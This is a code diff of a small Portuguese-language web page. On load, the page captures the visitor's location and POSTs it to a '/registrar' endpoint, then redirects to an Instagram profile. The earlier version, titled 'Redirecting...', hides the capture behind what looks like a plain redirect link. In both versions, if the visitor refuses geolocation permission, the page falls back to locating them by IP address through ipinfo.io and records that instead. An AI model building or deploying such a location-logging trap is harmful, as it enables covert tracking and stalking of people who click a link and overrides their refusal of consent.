@@ -1,41 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Redirecionando...</title>
-  <script>
-    function enviarLocalizacao(lat, lon, precisa) {
-      fetch('/registrar', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ lat, lon, precisa })
-      }).finally(() => {
-        window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
-      });
-    }
+    <title>Localizando...</title>
+    <meta charset="utf-8">
+    <script>
+        function enviarLocalizacao(lat, lon, precisa) {
+            fetch('/registrar', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ lat, lon, precisa })
+            }).finally(() => {
+                window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
+            });
+        }
 
-    function obterLocalizacao() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => enviarLocalizacao(pos.coords.latitude, pos.coords.longitude, true),
-          err => {
-            fetch('https://ipinfo.io/json?token=SEU_TOKEN_IPINFO')
-              .then(r => r.json())
-              .then(d => {
-                const [lat, lon] = d.loc.split(',');
-                enviarLocalizacao(parseFloat(lat), parseFloat(lon), false);
-              })
-              .catch(() => enviarLocalizacao(0.0, 0.0, false));
-          },
-          { timeout: 5000 }
-        );
-      } else {
-        enviarLocalizacao(0.0, 0.0, false);
-      }
-    }
+        function obterLocalizacao() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        enviarLocalizacao(pos.coords.latitude, pos.coords.longitude, true);
+                    },
+                    erro => {
+                        // Se não permitir, tentar via IP
+                        fetch('https://ipinfo.io/json?token=SEU_TOKEN_IPINFO')
+                            .then(res => res.json())
+                            .then(d => {
+                                const [lat, lon] = d.loc.split(',');
+                                enviarLocalizacao(parseFloat(lat), parseFloat(lon), false);
+                            }).catch(() => {
+                                enviarLocalizacao(0.0, 0.0, false);
+                            });
+                    },
+                    { timeout: 5000 }
+                );
+            } else {
+                enviarLocalizacao(0.0, 0.0, false);
+            }
+        }
 
-    window.onload = obterLocalizacao;
-  </script>
+        window.onload = obterLocalizacao;
+    </script>
 </head>
-<body></body>
+<body>
+    <p>Obtendo sua localização...</p>
+</body>
 </html>
